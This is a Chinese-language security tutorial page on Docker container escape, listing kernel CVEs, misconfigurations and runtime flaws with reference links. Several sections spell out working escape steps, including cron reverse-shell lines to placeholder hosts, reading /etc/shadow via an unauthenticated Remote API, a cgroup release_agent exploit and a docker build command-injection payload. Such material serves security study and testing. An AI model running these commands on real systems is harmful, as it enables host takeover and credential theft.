# Docker

Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在电脑上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台 Docker。

> fofa : app="docker-产品"

**相关文章**
- [Docker容器安全性分析](https://www.freebuf.com/articles/system/221319.html)
- [一些与Docker安全相关的知识点总结与整理](https://mp.weixin.qq.com/s/rKUpyEmurAioiMAFqYzfxg)
- [docker build时的安全问题](https://mp.weixin.qq.com/s/LNXyckCjg2uMNPNl0JWHqg)
- [容器安全事件排查与响应](https://mp.weixin.qq.com/s/rOOr_wCF4egpV_QlRIbtjQ)

**提权检测工具**
- [teamssix/container-escape-check](https://github.com/teamssix/container-escape-check) - 用来检测 Docker 容器中的逃逸方法的脚本
    ```bash
    git clone https://github.com/teamssix/container-escape-check.git
    cd container-escape-check
    chmod +x container-escape-check.sh
    ./container-escape-check.sh
    ```

**相关案例**
- [How We Escaped Docker in Azure Functions](https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/)
    - [通过Azure Functions提权漏洞实现Dockers逃逸](https://mp.weixin.qq.com/s/6CDbYZh7ChQ_hpuF29tsLA)

**Docker 逃逸**
- [云原生安全 | docker容器逃逸](https://mp.weixin.qq.com/s/zvHrPwYT77oedXloVJHi8g)
- [初识Docker逃逸](https://www.freebuf.com/articles/container/242763.html)
- [干货来啦！带你初探Docker逃逸](https://www.freebuf.com/company-information/205006.html)
- [Docker 逃逸小结第一版](https://paper.seebug.org/1288/)
- [容器逃逸方法 - cdxy](https://www.cdxy.me/?p=818)

---

## 内核漏洞导致的逃逸

**[Dirty COW(CVE-2016-5195)](../../OS安全/OS-Exploits.md#linux)**
- 漏洞描述

    通过 Dirty Cow 漏洞，结合 EXP，就可以返回一个宿主机的高权限 Shell，并拿到宿主机的 root 权限，可以直接操作宿主机的文件。

    VDSO(virtual dvnamic shared object) : 这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间。
    - 举个例子：gettimeofday 是一个获取当前时间的函数，它经常被用户的程序调用，如果一个程序需要知道当前的时间，程序就会频繁的轮询。为了减少资源开销，内核需要把它放在一个所有进程都能访问的内存位置，然后通过 VDSO 定义一个功能来共享这个对象，让进程来访问此信息。通过这种方式，调用的时间和资源花销就大大的降低了，速度也就变得更快。
    - 那么如何利用 VDSO 来实现 Docker 逃逸的？首先 POC 利用 Dirty Cow 漏洞，将 Payload 写到 VDSO 中的一些闲置内存中，并改变函数的执行顺序，使得在执行正常函数之前调用这个 Shellcode。Shellcode 初始化时会检测是否被 root 所调用，如果调用，则继续执行，如果没有调用则返回，并执行 clock_gettime 函数，接下来它会检测 `/tmp/.X` 文件的存在，如果存在，则这时已经是 root 权限了，然后它会打开一个反向的 TCP 链接，为 Shellcode 中填写的 ip 返回一个 Shell,漏洞就这样产生了。

- https://www.ichunqiu.com/experiment/detail?id=100297&source=2
- https://github.com/gebl/dirtycow-docker-vdso

**CVE-2017-7308**
- 相关文章
    - [Linux内核漏洞导致容器逃逸（CVE-2017-7308）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/kernel-cve-2017-7308)

**CVE-2017-1000112**
- 相关文章
    - [Linux内核漏洞导致容器逃逸（CVE-2017-1000112）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/kernel-cve-2017-1000112)

**CVE-2018-18955 Broken uid/gid Mapping for Nested User Namespaces**
- 漏洞描述

    CVE-2018-18955 漏洞涉及到 User 命名空间中的嵌套用户命名空间，用户命名空间中针对 uid（用户ID）和 gid（用户组ID）的 ID 映射机制保证了进程拥有的权限不会逾越其父命名空间的范畴。该漏洞利用创建用户命名空间的子命名空间时损坏的 ID 映射实现提权。

- 相关文章
    - [CVE-2018-18955漏洞学习](https://www.cnblogs.com/likaiming/p/10816529.html)
    - [CVE-2018-18955：较新Linux内核的提权神洞分析](https://www.freebuf.com/vuls/197122.html)

- POC | Payload | exp
    - [Linux - Broken uid/gid Mapping for Nested User Namespaces - Linux local Exploit](https://www.exploit-db.com/exploits/45886)

**CVE-2022-0185**
- 相关文章
    - [[漏洞分析] CVE-2022-0185 linux 内核提权(逃逸)](https://blog.csdn.net/Breeze_CAT/article/details/123007818)

**CVE-2022-0492**
- 相关文章
    - [Linux内核漏洞导致容器逃逸（CVE-2022-0492）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/kernel-cve-2022-0492)
    - [Docker又爆出高危逃逸漏洞了？仔细研究下事情没那么简单](https://mp.weixin.qq.com/s/7KptLnqd7tBLaFKHu-RVuw)
    - [[漏洞分析] CVE-2022-0492 容器逃逸漏洞分析](https://blog.csdn.net/breeze_cat/article/details/123427680)

**CVE-2022-0847**
- [CVE-2022-0847](../../OS安全/OS-Exploits.md#内核漏洞提权)

---

## 配置不当

**利用条件**
- root 权限启动 docker
- 主机上有镜像,或自己下载镜像
- API 版本大于 1.5

**docker.sock 挂载到容器内部**
- 漏洞描述

    Docker 采用 C/S 架构，我们平常使用的 Docker 命令中，docker 即为 client，Server 端的角色由 docker daemon 扮演，二者之间通信方式有以下3种：
    1. unix:///var/run/docker.sock
    2. tcp://host:port
    3. fd://socketfd

    其中使用 docker.sock 进行通信为默认方式，当容器中进程需在生产过程中与 Docker 守护进程通信时，容器本身需要挂载 `/var/run/docker.sock` 文件。

    本质上而言，能够访问 docker socket 或连接 HTTPS API 的进程可以执行 Docker 服务能够运行的任意命令，以 root 权限运行的 Docker 服务通常可以访问整个主机系统。

    因此，当容器访问 docker socket 时，我们可通过与 docker daemonv 的通信对其进行恶意操纵完成逃逸。若容器A可以访问 docker socket，我们便可在其内部安装 client（docker），通过 docker.sock 与宿主机的 server（docker daemon）进行交互，运行并切换至不安全的容器 B，最终在容器 B 中控制宿主机。

- 相关文章
    - [挂载docker.sock导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-docker-sock)

1. 首先运行一个挂载 `/var/run/` 的容器
    ```bash
    docker pull ubuntu:18.04
    docker run -it -v /var/run/:/host/var/run/ ubuntu:18.04 /bin/bash
    ```

2. 寻找下挂载的 sock 文件
    ```bash
    find / -name docker.sock
    ```

3. 在容器内安装 Docker 作为 client
    ```bash
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse" > /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse" >> /etc/apt/sources.list
    echo "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse" >> /etc/apt/sources.list
    apt-get update
    apt-get install -y docker.io vim

    echo "nameserver 114.114.114.114" > /etc/resolv.conf
    ```

4. 查看宿主机 docker 信息
    ```bash
    docker -H unix:///host/var/run/docker.sock info
    ```

5. 运行一个新容器并挂载宿主机根路径
    ```bash
    docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash
    ```

6. 在新容器 /aa 路径下完成对宿主机资源的访问,写入计划任务文件，反弹 shell
    ```bash
    cd /aa
    ls
    echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/9988 0>&1' >> /aa/var/spool/cron/root
    ```
    成功接收到宿主机反弹的 shell

**privileged 特权模式**
- 漏洞描述

    特权模式于版本 0.6 时被引入 Docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限。

    使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 `docker run --privileged` 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。

    当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。

- 相关文章
    - [特权容器导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/config-privileged-container)

1. 首先以特权模式运行一个 docker 容器
    ```bash
    docker run -it --privileged=true ubuntu /bin/bash
    ```

2. 查看磁盘文件
    ```bash
    fdisk -l
    ```

3. dm-0 存在于 `/dev` 目录下,新建一个目录,将 `/dev/dm-0` 挂载至新建的目录
    ```bash
    mkdir /aaa
    mount /dev/dm-0 /aaa
    ```

4. 写入计划任务到宿主机
    ```bash
    echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/2100 0>&1' >> /aaa/var/spool/cron/root
    ```

**capability SYS_ADMIN**
- 相关文章
    - [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

- 利用条件
    - 在容器内 root 用户
    - 容器必须使用 SYS_ADMIN Linux capability 运行
    - 容器必须缺少 AppArmor 配置文件，否则将允许 mount syscall
    - cgroup v1 虚拟文件系统必须以读写方式安装在容器内部

- 复现测试

    我们需要一个 cgroup，可以在其中写入 notify_on_release 文件(for enable cgroup notifications)，挂载 cgroup 控制器并创建子 cgroup，创建 `/bin/sh` 进程并将其 PID 写入 cgroup.procs 文件，sh 退出后执行 release_agent 文件。

1. 主机使用 SYS_ADMIN Linux capability 运行一个 docker 容器
    ```bash
    docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
    ```

2. 挂载 cgroup 控制器并创建子 cgroup
    ```bash
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    ```
    > 注:如果这里报错"mount: /tmp/cgrp: special device cgroup does not exist.",将 rdma 改为 memory

3. 创建 `/bin/sh` 进程并将其 PID 写入 cgroup.procs 文件，sh 退出后执行 release_agent 文件。
    ```bash
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent

    cat /tmp/cgrp/release_agent

    echo '#!/bin/sh' > /cmd
    echo "ls > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    head /output
    ```

**挂载宿主机 Procfs 系统导致容器逃逸**
- 漏洞描述

    procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 User Namespace 时. 有些业务为了实现某些特殊需要，会将该文件系统挂载进来

    procfs 中的 `/proc/sys/kernel/core_pattern` 负责配置进程崩溃时内存转储数据的导出方式。从 2.6.19 内核版本开始，Linux 支持在 `/proc/sys/kernel/core_pattern` 中使用新语法。如果该文件中的首个字符是管道符 `|`，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。可以利用上述机制，在挂载了宿主机 procfs 的容器内实现逃逸。

- 相关文章
    - [挂载宿主机Procfs系统导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs)

**Docker Remote API 未授权访问漏洞**
- 漏洞描述

    Docker Remote API 是一个取代远程命令行界面（rcli）的 REST API。存在问题的版本分别为 1.3 和 1.6 因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。

- 相关文章
    - [新姿势之Docker Remote API未授权访问漏洞分析和利用](https://wooyun.js.org/drops/%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8.html)
    - [Docker Remote API未授权访问漏洞复现](https://zgao.top/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
    - [Docker daemon api 未授权访问漏洞](https://mp.weixin.qq.com/s/sPNEQ5n0rQEspTi7UescLg)
    - [针对暴露Docker.Sock的攻击总结](https://mp.weixin.qq.com/s/65XvaD_U3gkwzjXzrrwOpw)

- POC | Payload | exp
    - `http://[ip]:2375/version`
        ```bash
        docker -H tcp://[IP]:2375 version
        docker -H tcp://[IP]:2375 ps

        docker -H tcp://[IP] run -it --privileged=true busybox sh
        fdisk -l
        mkdir /aaa
        mount /dev/dm-0 /aaa

        或

        docker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/mnt busybox sh
        cd /mnt
        ls

        或

        docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
        cat /mnt/etc/shadow
        chroot /mnt

        # 拿下后直接写 crontab 即可
        ```
    - [netxfly/docker-remote-api-exp](https://github.com/netxfly/docker-remote-api-exp)
    - [Tycx2ry/docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)
    - [docker daemon api 未授权访问漏洞](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md)
        ```py
        import docker

        client = docker.DockerClient(base_url='http://your-ip:2375/')
        data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 反弹地址 反弹端口 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
        ```

---

## 容器服务缺陷

**CVE-2019-5736 漏洞逃逸**
- 漏洞描述

    Docker、containerd 或者其他基于 runc 的容器在运行时存在安全漏洞，runC 是用于创建和运行 Docker 容器的 CLI 工具,runC 18.09.2版本前的 Docker 允许恶意容器覆盖宿主机上的 runC 二进制文件。攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改掉 runc 的二进制文件，从而获取到宿主机的 root 执行权限。

- 影响版本
    - Docker Version < 18.09.2
    - runC Version <= 1.0-rc6

- 相关文章
    - [Breaking out of Docker via runC - Explaining CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
    - [RUNC 严重安全漏洞CVE-2019-5736 导致容器逃逸](http://blog.nsfocus.net/runc-cve-2019-5736/)

- POC | Payload | exp
    - [Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)

**CVE-2019-13139 Docker build code execution**
- 漏洞描述

    在 18.09.4 之前的 Docker 中，能够提供或操纵 `docker build` 命令的构建路径的攻击者将能够获得命令执行。在 `docker build` 处理远程 git URL 的方式中存在一个问题，并导致命令注入到底层的 `git clone` 命令中，从而导致用户在执行 `docker build` 命令的上下文中执行代码。出现这种情况是因为 git ref 可能被误解为标志。

- 影响版本
    - Docker Version < 18.09.4

- 相关文章
    - [CVE-2019-13139 - Docker build code execution · Staaldraad](https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)
    - [CVE-2019-13139—Docker build时的命令注入漏洞](https://xz.aliyun.com/t/5729) - 上面英文版的翻译
    - [Docker构建漏洞导致代码执行（CVE-2019-13139）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-13139)

- POC | Payload | exp
    ```
    docker build "git@g.com/a/b#--upload-pack=echo "hello">flag;#:"
    ```

**CVE-2019-14271 Docker cp**
- 漏洞描述

    在在与 GNU C 库（也称为 glibc）链接的 19.03.1 之前的 Docker 19.03.x 中，当 nsswitch 工具动态地在包含容器内容的 chroot 内加载库时，可能会发生代码注入。

- 影响版本
    - 19.03 <= Docker Version < 19.03.1

- 相关文章
    - [Docker Patched the Most Severe Copy Vulnerability to Date With CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)
    - [CVE-2019-14271：Docker cp命令漏洞分析](https://www.anquanke.com/post/id/193218)
    - [Docker copy漏洞导致容器逃逸（CVE-2019-14271）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271)

**CVE-2020-15257**
- 漏洞描述

    Containerd 是一个控制 runC 的守护进程，提供命令行客户端和 API，用于在一个机器上管理容器。

    在版本 1.3.9 之前和 1.4.0~1.4.2 的 Containerd 中，由于在网络模式为 host 的情况下，容器与宿主机共享一套 Network namespace ，此时 containerd-shim API 暴露给了用户，而且访问控制仅仅验证了连接进程的有效 UID 为 0，但没有限制对抽象 Unix 域套接字的访问，刚好在默认情况下，容器内部的进程是以 root 用户启动的。在两者的共同作用下，容器内部的进程就可以像主机中的 containerd 一样，连接 containerd-shim 监听的抽象 Unix 域套接字，调用 containerd-shim 提供的各种 API，从而实现容器逃逸。

- 相关文章
    - [Containerd漏洞导致容器逃逸（CVE-2020-15257）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-containerd-cve-2020-15257)
    - [CVE-2020-15257：Containerd虚拟环境逃逸复现](https://mp.weixin.qq.com/s/tyxJhqcZ3QTSjAqTZZSgrA)

## 更多内容

- [镜像仓库安全](../../../../Integrated/容器/Docker.md#镜像仓库安全)
- [镜像安全扫描](../../../../Integrated/容器/Docker.md#镜像安全扫描)
- [容器逆向分析](../../../../Integrated/容器/Docker.md#容器逆向分析)
- [容器运行时监控](../../../../Integrated/容器/Docker.md#容器运行时监控)
- [容器安全审计](../../../../Integrated/容器/Docker.md#容器安全审计)
